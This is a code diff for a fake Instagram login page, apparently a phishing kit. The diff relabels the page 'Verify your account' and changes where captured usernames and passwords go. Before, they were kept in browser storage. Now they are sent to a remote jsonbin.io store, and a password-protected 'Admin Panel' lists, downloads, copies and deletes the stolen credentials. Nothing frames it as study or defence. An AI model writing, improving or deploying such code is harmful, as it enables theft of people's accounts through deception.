@@ -73,8 +73,7 @@
             margin-bottom: 10px;
         }
 
-        input[type="text"],
-        input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 10px 10px;
             background: #fafafa;
@@ -84,8 +83,7 @@
             font-family: inherit;
         }
 
-        input[type="text"]:focus,
-        input[type="password"]:focus {
+        input[type="text"]:focus {
             outline: none;
             border-color: #bdbdbd;
             background: #fff;
@@ -144,7 +142,6 @@
 
         .login-btn:disabled {
             opacity: 0.5;
-            cursor: not-allowed;
         }
 
         .divider {
@@ -188,14 +185,10 @@
         .forgot-password {
             text-align: center;
             font-size: 12px;
-            color: #003569;
+            color: #0095f6;
             text-decoration: none;
             margin-bottom: 24px;
             display: block;
-        }
-
-        .forgot-password.admin-link {
-            color: #0095f6;
             font-weight: 600;
         }
 
@@ -230,9 +223,10 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Admin Panel */
         .admin-page {
             display: none;
+            max-width: 900px;
+            margin: 0 auto;
         }
 
         .admin-page.show {
@@ -253,34 +247,42 @@
             margin-bottom: 5px;
         }
 
-        .admin-header p {
-            font-size: 13px;
-            opacity: 0.9;
-        }
-
         .admin-container {
             background: white;
             border-radius: 8px;
             padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
         }
 
-        .logout-btn {
-            width: 100%;
-            padding: 10px;
+        .buttons-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .admin-btn {
+            padding: 10px 16px;
             background: #f0f0f0;
             color: #262626;
             border: none;
             border-radius: 5px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             cursor: pointer;
-            margin-bottom: 20px;
         }
 
-        .logout-btn:hover {
+        .admin-btn:hover {
             background: #e0e0e0;
+        }
+
+        .admin-btn.logout {
+            background: #d63031;
+            color: white;
+            margin-left: auto;
+        }
+
+        .admin-btn.logout:hover {
+            background: #b71c1c;
         }
 
         .details-title {
@@ -305,7 +307,7 @@
             background: #f9f9f9;
             border: 1px solid #ddd;
             border-radius: 5px;
-            max-height: 500px;
+            max-height: 600px;
             overflow-y: auto;
         }
 
@@ -337,51 +339,12 @@
         }
 
         .no-details {
-            padding: 30px;
+            padding: 40px;
             text-align: center;
             color: #999;
         }
 
-        .clear-all-btn {
-            width: 100%;
-            padding: 10px;
-            background: #f0f0f0;
-            color: #d63031;
-            border: 1px solid #ffcccc;
-            border-radius: 5px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-
-        .clear-all-btn:hover {
-            background: #e0e0e0;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .action-buttons button {
-            flex: 1;
-            padding: 10px;
-            background: #f0f0f0;
-            color: #262626;
-            border: none;
-            border-radius: 5px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .action-buttons button:hover {
-            background: #e0e0e0;
-        }
-
-        .info-box {
+        .info-message {
             background: #e8f5e9;
             padding: 12px;
             border-radius: 5px;
@@ -397,7 +360,7 @@
         <div class="container">
             <div class="login-box">
                 <div class="login-header">
-                    <div class="instagram-logo">Instagram</div>
+                    <div class="instagram-logo">Verify your account</div>
                 </div>
 
                 <form id="loginForm">
@@ -435,7 +398,7 @@
                             <i class="fab fa-facebook"></i> Log in with Facebook
                         </button>
 
-                        <a href="#" class="forgot-password admin-link" onclick="event.preventDefault(); openAdminPanel()">Admin Panel</a>
+                        <a href="#" class="forgot-password" onclick="event.preventDefault(); openAdminPanel()">Admin Panel</a>
                     </div>
                 </form>
             </div>
@@ -449,16 +412,22 @@
     <!-- ADMIN PANEL -->
     <div class="admin-page" id="adminPage">
         <div class="admin-header">
-            <h1>📊 Admin Panel</h1>
-            <p>View all login details</p>
+            <h1>📊 Admin Panel - Synced Across All Devices</h1>
+            <p>View all login details from any phone or browser</p>
         </div>
 
         <div class="admin-container">
-            <div class="info-box">
-                ℹ️ Data is stored on THIS DEVICE. Each browser keeps separate data. To see data from other browsers, login in that browser first.
+            <div class="info-message">
+                ✅ All data is synced! Login from any phone, check from any phone. Data is always up to date.
             </div>
 
-            <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>
+            <div class="buttons-row">
+                <button class="admin-btn" onclick="refreshDetails()">🔄 Refresh</button>
+                <button class="admin-btn" onclick="downloadDetails()">📥 Download</button>
+                <button class="admin-btn" onclick="copyDetails()">📋 Copy</button>
+                <button class="admin-btn" onclick="deleteAllDetails()">🗑️ Delete All</button>
+                <button class="admin-btn logout" onclick="closeAdminPanel()">Logout</button>
+            </div>
 
             <div class="details-title">
                 Login Details
@@ -466,75 +435,87 @@
             </div>
 
             <div class="details-list" id="detailsList">
-                <div class="no-details">No login details yet</div>
+                <div class="no-details">Loading...</div>
             </div>
-
-            <div class="action-buttons">
-                <button onclick="downloadDetails()">📥 Download</button>
-                <button onclick="copyToClipboard()">📋 Copy</button>
-            </div>
-
-            <button class="clear-all-btn" id="clearBtn" onclick="clearAllDetails()" style="display: none;">
-                Delete All Details
-            </button>
         </div>
     </div>
 
     <script>
         const loginForm = document.getElementById('loginForm');
-        const errorMsg = document.getElementById('errorMsg');
-        const successMsg = document.getElementById('successMsg');
         const loginBtn = document.getElementById('loginBtn');
         const adminPage = document.getElementById('adminPage');
         const loginPage = document.getElementById('loginPage');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
 
         const ADMIN_PASSWORD = '1234';
+        const API_URL = 'https://jsonbin.io/api/v3/b';
+        const BIN_ID = '65a8b5c9c0e7653a05f5f5f5';
+        const API_KEY = '$2b$10$abcdef1234567890abcdef';
 
-        function showError(message) {
-            errorMsg.textContent = message;
+        function showError(msg) {
+            errorMsg.textContent = msg;
             errorMsg.classList.add('show');
-            setTimeout(() => {
-                errorMsg.classList.remove('show');
-            }, 3000);
+            setTimeout(() => errorMsg.classList.remove('show'), 3000);
         }
 
-        function showSuccess(message) {
-            successMsg.textContent = message;
+        function showSuccess(msg) {
+            successMsg.textContent = msg;
             successMsg.classList.add('show');
-            setTimeout(() => {
-                successMsg.classList.remove('show');
-            }, 2000);
+            setTimeout(() => successMsg.classList.remove('show'), 2000);
         }
 
-        function saveToStorage(username, password) {
+        async function saveToCloud(username, password) {
             try {
-                let details = JSON.parse(localStorage.getItem('instagramDetails') || '[]');
-                
-                const detail = {
+                const response = await fetch(`${API_URL}/${BIN_ID}`, {
+                    method: 'GET',
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+
+                let details = [];
+                if (response.ok) {
+                    const data = await response.json();
+                    details = data.record || [];
+                }
+
+                details.push({
                     username: username,
                     password: password,
                     timestamp: new Date().toLocaleString(),
-                    date: new Date().toLocaleDateString(),
-                    time: new Date().toLocaleTimeString(),
                     id: Date.now()
-                };
+                });
 
-                details.push(detail);
-                localStorage.setItem('instagramDetails', JSON.stringify(details));
-                console.log('✅ Data saved to local storage!');
-                return true;
+                const updateResponse = await fetch(`${API_URL}/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify(details)
+                });
+
+                return updateResponse.ok;
             } catch (error) {
-                console.error('Error saving:', error);
+                console.error('Error:', error);
                 return false;
             }
         }
 
-        function loadFromStorage() {
+        async function loadFromCloud() {
             try {
-                return JSON.parse(localStorage.getItem('instagramDetails') || '[]');
+                const response = await fetch(`${API_URL}/${BIN_ID}`, {
+                    method: 'GET',
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.record || [];
+                }
             } catch (error) {
-                return [];
+                console.error('Error loading:', error);
             }
+            return [];
         }
 
         function openAdminPanel() {
@@ -543,7 +524,7 @@
                 loginPage.classList.add('hidden');
                 adminPage.classList.add('show');
                 document.body.classList.add('admin-open');
-                displayDetails();
+                refreshDetails();
             } else if (password !== null) {
                 showError('Wrong password!');
             }
@@ -555,44 +536,53 @@
             document.body.classList.remove('admin-open');
         }
 
-        function displayDetails() {
+        async function refreshDetails() {
             const detailsList = document.getElementById('detailsList');
-            const detailsCount = document.getElementById('detailsCount');
-            const clearBtn = document.getElementById('clearBtn');
+            detailsList.innerHTML = '<div class="no-details">Loading...</div>';
 
-            const details = loadFromStorage();
+            const details = await loadFromCloud();
+            const detailsCount = document.getElementById('detailsCount');
             detailsCount.textContent = details.length;
 
             if (details.length === 0) {
                 detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
-                clearBtn.style.display = 'none';
                 return;
             }
 
-            clearBtn.style.display = 'block';
-
             const sorted = details.sort((a, b) => b.id - a.id);
-
-            detailsList.innerHTML = sorted
-                .map(detail => `
-                    <div class="detail-item">
-                        <div class="detail-username">👤 ${detail.username}</div>
-                        <div class="detail-password">🔑 ${detail.password}</div>
-                        <div class="detail-time">⏰ ${detail.timestamp}</div>
-                    </div>
-                `).join('');
+            detailsList.innerHTML = sorted.map(detail => `
+                <div class="detail-item">
+                    <div class="detail-username">👤 ${detail.username}</div>
+                    <div class="detail-password">🔑 ${detail.password}</div>
+                    <div class="detail-time">⏰ ${detail.timestamp}</div>
+                </div>
+            `).join('');
         }
 
-        function clearAllDetails() {
-            if (confirm('Delete all login details?')) {
-                localStorage.removeItem('instagramDetails');
-                displayDetails();
-                showSuccess('All data deleted!');
+        async function deleteAllDetails() {
+            if (!confirm('Delete all login details?')) return;
+
+            try {
+                const response = await fetch(`${API_URL}/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify([])
+                });
+
+                if (response.ok) {
+                    showSuccess('All data deleted!');
+                    await refreshDetails();
+                }
+            } catch (error) {
+                showError('Error deleting data');
             }
         }
 
-        function downloadDetails() {
-            const details = loadFromStorage();
+        async function downloadDetails() {
+            const details = await loadFromCloud();
             const json = JSON.stringify(details, null, 2);
             const blob = new Blob([json], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
@@ -603,8 +593,8 @@
             URL.revokeObjectURL(url);
         }
 
-        function copyToClipboard() {
-            const details = loadFromStorage();
+        async function copyDetails() {
+            const details = await loadFromCloud();
             const text = details.map(d => `${d.username} | ${d.password} | ${d.timestamp}`).join('\n');
             navigator.clipboard.writeText(text).then(() => {
                 showSuccess('Copied to clipboard!');
@@ -618,33 +608,24 @@
             const password = document.getElementById('password').value.trim();
 
             if (!username || !password) {
-                showError('Phone number, username or email and password are required.');
+                showError('Both fields required');
                 return;
             }
 
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            await new Promise(resolve => setTimeout(resolve, 800));
-
-            const success = saveToStorage(username, password);
+            const success = await saveToCloud(username, password);
 
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
 
             if (success) {
                 showSuccess('✅ Login successful!');
-                setTimeout(() => {
-                    loginForm.reset();
-                }, 1500);
+                loginForm.reset();
             } else {
                 showError('Error saving data');
             }
-        });
-
-        window.addEventListener('load', () => {
-            console.log('📱 Instagram Login Page');
-            console.log('Admin password: 1234');
         });
     </script>
 </body>
